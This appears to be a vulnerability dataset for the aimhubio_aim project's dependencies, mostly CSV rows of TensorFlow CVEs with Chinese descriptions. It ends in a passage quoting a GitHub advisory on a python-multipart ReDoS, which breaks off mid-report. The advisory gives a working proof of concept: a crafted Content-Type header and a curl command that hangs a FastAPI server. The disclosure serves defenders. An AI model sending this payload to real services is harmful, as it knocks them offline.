Google TensorFlow 中存在输入验证错误漏洞，该漏洞源于产品 requantization 的 MKL 实现未对空指针做有效验证，攻击者可通过解引用空指针访问堆分配数组之外的数据。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
aimhubio_aim,tensorflow,,True,CVE-2020-15208,CWE-125 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
tensorflow-lite 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者进行超出范围的读写操作。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-29216,CWE-94,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在代码注入漏洞，该漏洞源于saved_model_cli工具存在代码注入问题。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-29518,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4 存在安全漏洞，该漏洞源于在立即模式下会话操作是无效的。但是用户仍然可以调用与之关联的原始操作，并触发空指针解引用。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-29582,CWE-125,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在缓冲区错误漏洞，该漏洞源于tf.raw_ops.Dequantize缺少验证。攻击者可利用该漏洞可以从堆分配的数据边界之外触发读取。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-35986,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 RaggedBincount 被赋予一个空的输入张量 splits ，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41196,CWE-191,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于 TensorFlow 实现了池化操作，其中滑动窗口中的值没有被严格检查为正数。",3,0
aimhubio_aim,tensorflow,,True,CVE-2020-15195,CWE-119 CWE-122 CWE-787,2020-09-25,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
 Tensorflow SparseFillEmptyRowsGrad 1.15.4之前版本, 2.0.3版本, 2.1.2版本, 2.2.1版本，2.3.1版本中存在安全漏洞，该漏洞允许攻击者造成缓存区溢出问题。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37684,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于TFLite 中除法的实现易受 0 错误除法的影响。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37656,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，攻击者可以通过将引用绑定到""tf.raw_ops.RaggedTensorToSparse""中的空指针来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2018-21233,CWE-125,2020-05-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.7.0之前版本中的core/kernels/decode_bmp_op.cc文件的BMP decoder的DecodeBmp功能存在缓冲区错误漏洞。攻击者可利用该漏洞获取进程内存的内容。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-35938,CWE-125,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 GatherNd 函数接受确定输入和输出大小的参数。如果给定的输入大于或等于输出的大小，则会触发越界内存读取或崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-41225,CWE-908,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 Grappler 优化器使用了未初始化的变量。 如果 train_nodes 向量（从保存的优化模型中获得）不包含 Dequeue 节点，那么 dequeue_node 将被单元化。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29564,CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在代码问题漏洞，攻击者可利用该漏洞触发空指针解引用。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-29200,CWE-20 CWE-1284,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.LSTMBlockCell 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41896,CWE-20 CWE-1284,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果 `ThreadUnsafeUnigramCandidateSampler` 的输入 `filterbank_channel_count` 大于允许的最大大小，TensorFlow 将崩溃。,3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37679,CWE-125 CWE-681,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 中存在缓冲区错误漏洞，该漏洞源于产品可能会泄露内存信息。 以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-23580,CWE-400 CWE-1284,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在资源管理错误漏洞，修复将包含在TensorFlow 2.8.0中。我们也会在TensorFlow 2.7.1、TensorFlow 2.6.3和TensorFlow 2.5.3上选择这个提交，因为这些也会受到影响，并且仍然在支持范围内。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37663,CWE-20,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.QuantizeV2 中的不完整验证造成的。攻击者可利用该漏洞通过将引用绑定到空指针来触发未定义的行为，或者可以访问堆分配数组边界之外的数据。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-37649,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.6.0 之前版本、2.5.1之前版本、2.4.3之前版本和2.3.4之前版本存在代码问题漏洞，该漏洞源于“tf.raw_ops.UncompressElement”的代码可以用来触发空指针解引用",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-41898,CWE-20,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。出现此漏洞是因为如果 `SparseFillEmptyRowsGrad` 的输入为空，TensorFlow将崩溃。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35935,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于容易受到因断言失败导致的拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23568,CWE-190,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于AddManySparseToTensorsMap的实现容易受到整数溢出的影响，当构建新的TensorShape对象时，会导致CHECK失败(基于拒绝服务的断言失败)。",2,0
aimhubio_aim,tensorflow,,True,CVE-2020-26268,CWE-471,2020-12-10,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow存在安全漏洞，攻击者可利用该漏洞导致缓冲区溢出。以下产品及版本受到影响：1.15.5、2.0.4、2.1.3、2.2.2、2.3.2、2.4.0。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29600,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在数字错误漏洞，该漏洞源于TFLite操作符OneHot的实现是一个除法零错误。",4,0
aimhubio_aim,tensorflow,,True,CVE-2020-15266,CWE-119,2020-10-21,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 2.4.0之前版本存在安全漏洞，该漏洞源于当tf.image.crop_and_resize 的 boxes的参数有一个非常大的值，CPU内核实现接收它作为一个c++  nan 浮点值。试图对其进行操作是一种未定义的行为，稍后会产生分割错误。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25665,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的开源平台。2.12.0版本之前的2.12版本和2.11.1版本之前的2.11版本存在代码问题，该漏洞源于当'SparseSparseMaximum'被赋予无效的稀疏张量作为输入时，会导致空指针解引用错误。,2,2
aimhubio_aim,tensorflow,,True,CVE-2019-16778,CWE-122 CWE-681,2019-12-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 1.15之前版本中的UnsortedSegmentSum存在缓冲区错误漏洞，该漏洞源于程序没有正确检查边界。本地攻击者可利用该漏洞在系统上执行任意代码或导致应用程序崩溃。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-21726,CWE-125,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在缓冲区错误漏洞，该漏洞源于Dequantize的实现并不完全验证axis的值，并可能导致堆OOB访问。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-41216,CWE-120 CWE-787,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于 Transpose 的形状推断函数容易受到堆缓冲区溢出的影响。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23577,CWE-476,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在代码问题漏洞，该漏洞源于 GetInitOp 的实现很容易因对空指针进行解引用而导致崩溃。",2,0
aimhubio_aim,tensorflow,,True,CVE-2021-41204,CWE-824,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于在TensorFlow受影响版本的抓取器优化阶段，常量折叠可能试图深度复制资源张量。这将导致分段错误，因为这些张量应该是不变的。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41884,CWE-670,2022-11-18,Google TensorFlow是一款用于机器学习的开源平台。当创建的numpy数组的形状为一个元素为零而其他元素之和为一个大数时，可能导致错误，引发应用程序崩溃。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23586,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，恶意用户可以通过更改SavedModel，从而在function中断言，从而导致拒绝服务。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35991,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 TensorListScatter 和 TensorListScatterV2 收到等级大于 1 的 element_shape 时，它们会给出断言失败，这可能会触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23579,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于TensorFlow中的格斗器优化器可以通过修改SavedModel来导致拒绝服务，这样SafeToRemoveIdentity就会触发CHECK失败。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-36016,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tensorflow::full_type::SubstituteFromAttrs 收到不完全是三个参数的 FullTypeDef& t 时，它会触发 CHECK -fail 而不是返回状态。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-29212,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在输入验证错误漏洞，该漏洞源于应用在使用 TFLite 模型转换器创建的某些 TFLite 模型在加载到 TFLite 解释器时会发生崩溃。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23571,CWE-617,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞攻击者在TensorFlow流程中导致拒绝服务。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-29191,CWE-20,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本、2.6.4之前版本存在输入验证错误漏洞，该漏洞源于 tf.raw_ops.GetSessionTensor 不会完全验证输入参数，从而导致 CHECK 失败，并且触发拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-36013,CWE-476,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于当 mlir::tfg::GraphDefImporter::ConvertNodeDef 尝试在没有操作名称的情况下转换 NodeDef 时，它会崩溃。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-41198,CWE-190,2021-11-05,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，在受影响的版本中，如果使用大输入参数调用 `tf.tile`，那么 TensorFlow 进程将由于溢出导致的 `CHECK` 失败而崩溃。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-35998,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果 EmptyTensorList 接收到具有多个维度的输入 element_shape ，它会给出断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37652,CWE-416 CWE-415,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.5.1，2.4.3和2.3.4存在资源管理错误漏洞，攻击者可以利用该漏洞导致TensorFlow异常终止。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-35963,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于 FractionalAvgPoolGrad 的实现没有完全验证输入 orig_input_tensor_shape 。这会导致溢出，导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25674,CWE-476,2023-03-24,Google TensorFlow是一个用于机器学习的端到端开源平台。2.12.0 版本之前的 2.12 版本和 2.11.1 版本之前的 2.11 版本存在空指针错误，该漏洞源于启用 XLA 的 RandomShuffle 操作。,2,2
aimhubio_aim,tensorflow,,True,CVE-2022-35974,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 QuantizeDownAndShrinkRange 为 input_min 或 input_max 提供非标量输入，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37658,CWE-824,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在缓冲区错误漏洞，该漏洞源于攻击者可以通过在所有类型为 `tf.raw_ops.MatrixSetDiagV*` 的操作中绑定对空指针的引用来导致未定义的行为。以下产品及版本收到影响：TensorFlow 2.5.1、TensorFlow 2.4.3 和 TensorFlow 2.3.4。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29568,CWE-824 CWE-476,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2版本、2.3.3版本、2.2.3版本、2.1.4版本存在代码问题漏洞，攻击者可利用该漏洞可以通过绑定tf.raw_ops.ParameterizedTruncatedNormal的空指针来触发未定义的行为。",4,0
aimhubio_aim,tensorflow,,True,CVE-2022-36017,CWE-20,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在输入验证错误漏洞，该漏洞源于如果 Requantize 被赋予 input_min 、 input_max 、 requested_output_min 、 requested_output_max 非零秩张量，则会导致可用于触发拒绝服务攻击的段错误。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37636,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在数字错误漏洞，该漏洞源于`SparseDenseCwiseDiv` 中的浮点异常。",3,0
aimhubio_aim,tensorflow,,True,CVE-2022-41889,CWE-476,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于如果将量化张量列表分配给属性，则pywrap代码无法解析张量并返回未捕获的‘nullptr’。,3,0
aimhubio_aim,tensorflow,,True,CVE-2022-23573,CWE-908,2022-02-04,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于 AssignOp 的实现可以导致将未初始化的数据复制到一个新的张量。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-41900,CWE-125 CWE-787,2022-11-18,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞出现在TensorFlow的池化操作中，导致FractionalMax(AVG)Pool具有非法的pooling_ratio，攻击者可以利用此漏洞访问不受用户控制的堆内存。,2,0
aimhubio_aim,tensorflow,,True,CVE-2022-21731,CWE-843,2022-02-03,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Tensorflow 存在安全漏洞，该漏洞源于ConcatV2的形状推断实现可用于通过由类型混淆引起的段错误触发拒绝服务攻击。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-36005,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于当 tf.quantization.fake_quant_with_min_max_vars_gradient 接收到非标量的输入 min 或 max 时，它会给出可能触发拒绝服务攻击的断言失败。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-27579,CWE-697,2023-03-24,TensorFlow是一个用于机器学习的端到端开源平台。使用小于1的参数“filter_input_channel”构建tflite模型会导致浮点异常(FPE)。该漏洞在2.12版本中被修复。,2,2
aimhubio_aim,tensorflow,,True,CVE-2021-37654,CWE-125,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在缓冲区错误漏洞，该漏洞源于在受影响的版本中，tf.raw_ops.ResourceGather缺少有效的限制，攻击者可以在TensorFlow的调试版本中执行“检查”-失败，或从发布版本中相同API中的堆分配的边界之外数据读取，来触发崩溃。",2,0
aimhubio_aim,tensorflow,,True,CVE-2022-36018,CWE-617,2022-09-16,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在安全漏洞，该漏洞源于如果为 RaggedTensorToVariant 提供了一个 rt_nested_splits 列表，其中包含除 1 之外的等级张量，则会导致断言失败，可用于触发拒绝服务攻击。该漏洞将在 2.10.0 版本， 2.9.1 版本， 2.8.1 版本， 2.7.2 版本中得到修复。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-37660,CWE-369,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow存在数字错误漏洞，该漏洞源于软件未正确计算或转换所产生的数字。攻击者可利用该漏洞可以通过调用特制的参数的操作导致数据被0除，从而导致浮点异常。",3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25664,CWE-120 CWE-122,2023-03-24,Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。该漏洞源于TAvgPoolGrad中存在堆缓冲区溢出，影响版本为2.12.0及之前的版本（不包括2.11.1）。,2,2
aimhubio_aim,tensorflow,,True,CVE-2022-41888,CWE-20,2022-11-18,TensorFlow是一个用于机器学习的开源平台。在GPU上运行时，`tf.image.generate_bounding_box_proposals`函数收到一个未进行检查的`scores`输入，该输入必须为4级。,3,0
aimhubio_aim,tensorflow,,True,CVE-2023-25670,CWE-476,2023-03-24,TensorFlow是一个强大的开源机器学习框架，用于构建和训练各种复杂的神经网络模型。在版本2.12.0之前的2.12和版本2.11.1之前的2.11中，QuantizedMatMulWithBiasAndDequantize操作存在零点错误，可能导致空指针解引用问题。,2,2
aimhubio_aim,tensorflow,,True,CVE-2022-29204,CWE-20 CWE-191,2022-05-20,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 2.9.0之前版本、2.8.1之前版本、2.7.2之前版本和2.6.4之前版本存在安全漏洞，该漏洞源于tf.raw_ops.UnsortedSegmentJoin 对于输入的参数存在不完全验证。攻击者利用该漏洞可以触发断言失败实现拒绝服务攻击。",3,0
aimhubio_aim,tensorflow,,True,CVE-2021-29585,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于没有检查stride是否为0。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-29602,CWE-369,2021-05-14,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
TensorFlow 2.4.2,2.3.3,2.2.3，2.1.4存在安全漏洞，该漏洞源于DepthwiseConvTFLite操作符的实现容易出现被除零错误。",4,0
aimhubio_aim,tensorflow,,True,CVE-2021-37688,CWE-476,2021-08-12,"Google TensorFlow是美国谷歌（Google）公司的一套用于机器学习的端到端开源平台。
Google TensorFlow 存在代码问题漏洞，该漏洞源于在受影响的版本中，攻击者可以制作一个 TFLite 模型来触发空指针取消引用，这将导致崩溃和拒绝服务。",2,0
aimhubio_aim,azure-storage-blob,,True,CVE-2022-30187,CWE-327,2022-07-12,"Microsoft Azure是美国微软（Microsoft）公司的一套开放的企业级云计算平台。
Microsoft Azure存在加密问题漏洞。以下产品和版本受到影响：Azure Storage Blobs client library for .NET,Azure Storage Queues client library for .NET,Azure Storage Blobs client library for Java,Azure Storage Queues client library for Python,Azure Storage Blobs client library for Python.",3,2
aimhubio_aim,fastapi,>=0.87.0,True,CVE-2024-24762,CWE-400 CWE-1333,,python-multipart是由个人开发者Marcelo Trylesinski开发的一个Python流式多部分解析器。该组件用于解析HTTP请求中的内容类型。此漏洞发生在版本0.0.7之前，攻击者可以通过发送特制的Content-Type头部，该头部使得正则表达式解析过程消耗过多的CPU资源，导致服务无法响应其他请求。此问题源于不当的正则表达式使用，造成灾难性回溯，进而使主事件循环无限期停止。,2,1
aimhubio_aim,fastapi,>=0.87.0,True,,CWE-1333 CWE-400,2024-02-06,"## Duplicate Advisory
This advisory has been withdrawn because it is a duplicate of GHSA-2jv5-9r88-3w3p. This link is maintained to preserve external references.

## Original Description

### Summary

When using form data, `python-multipart` uses a Regular Expression to parse the HTTP `Content-Type` header, including options.

An attacker could send a custom-made `Content-Type` option that is very difficult for the RegEx to process, consuming CPU resources and stalling indefinitely (minutes or more) while holding the main event loop. This means that process can't handle any more requests.

This can create a ReDoS (Regular expression Denial of Service): https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS

This only applies when the app uses form data, parsed with `python-multipart`.

### Details

A regular HTTP `Content-Type` header could look like:

```
Content-Type: text/html; charset=utf-8
```

`python-multipart` parses the option with this RegEx: https://github.com/andrew-d/python-multipart/blob/d3d16dae4b061c34fe9d3c9081d9800c49fc1f7a/multipart/multipart.py#L72-L74

A custom option could be made and sent to the server to break it with:

```
Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\
```

This is also reported to Starlette at: https://github.com/encode/starlette/security/advisories/GHSA-93gm-qmq6-w238

### PoC

Create a FastAPI app that uses form data:

```Python
# main.py
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

Then start it with:

```console
$ uvicorn main:app

INFO:     Started server process [50601]
INFO:     Waiting for application startup.
INFO:     ASGI 'lifespan' protocol appears unsupported.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:8000 (Press CTRL+C to quit)
```

Then send the attacking request with:

```console
$ curl -v -X 'POST' -H $'Content-Type: application/x-www-form-urlencoded; !=\""\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\' --data-binary 'input=1' 'http://localhost:8000/submit/'
```

#### Stopping it

Because that holds the main loop consuming the CPU non-stop, it's not possible to simply kill Uvicorn with `Ctrl+C` as it can't handle the signal.

To stop it, first check the process ID running Uvicorn:

```console
$ ps -fA | grep uvicorn

  501 59461 24785   0  4:28PM ttys004    0:00.13 /Users/user/code/starlette/env3.10/bin/python /Users/user/code/starlette/env3.10/bin/uvicorn redos_starlette:app
  501 59466 99935   0  4:28PM ttys010    0:00.00 grep uvicorn
```

In this case, the process ID was `59461`, then you can kill it (forcefully, with `-9`) with:

```console
$ kill -9 59461
```

### Impact

It's a ReDoS, (Regular expression Denial of Service), it only applies to those reading form data, using `python-multipart`. This way it also affects other libraries using Starlette, like FastAPI.

### Original Report

This was originally reported to FastAPI as an email to security@tiangolo.com, sent via https://huntr.com/, the original reporter is Marcello, https://github.com/byt3bl33d3r

<details>
<summary>Original report to FastAPI</summary>

Hey Tiangolo!

My name's Marcello and I work on the ProtectAI/Huntr Threat Research team, a few months ago we got a report (from @nicecatch2000) of a ReDoS affecting another very popular Python web framework. After some internal research, I found that FastAPI is vulnerable to the same ReDoS under certain conditions (only when it parses Form data not JSON).

Here are the details: I'm using the latest version of FastAPI (0.109.0) and the following code:

```Python
from typing import Annotated
from fastapi.responses import HTMLResponse
from fastapi import FastAPI,Form
from pydantic import BaseModel

class Item(BaseModel):
    username: str

app = FastAPI()

@app.get(""/"", response_class=HTMLResponse)
async def index():
    return HTMLResponse(""Test"", status_code=200)

@app.post(""/submit/"")
async def submit(username: Annotated[str, Form()]):
    return {""username"": username}

@app.post(""/submit_json/"")
async def submit_json(item: Item):
    return {""username"": item.username}
```

I'm running the above with uvicorn with the following command:

```console
uvicorn server:app
```

Then run the following cUrl command:

```
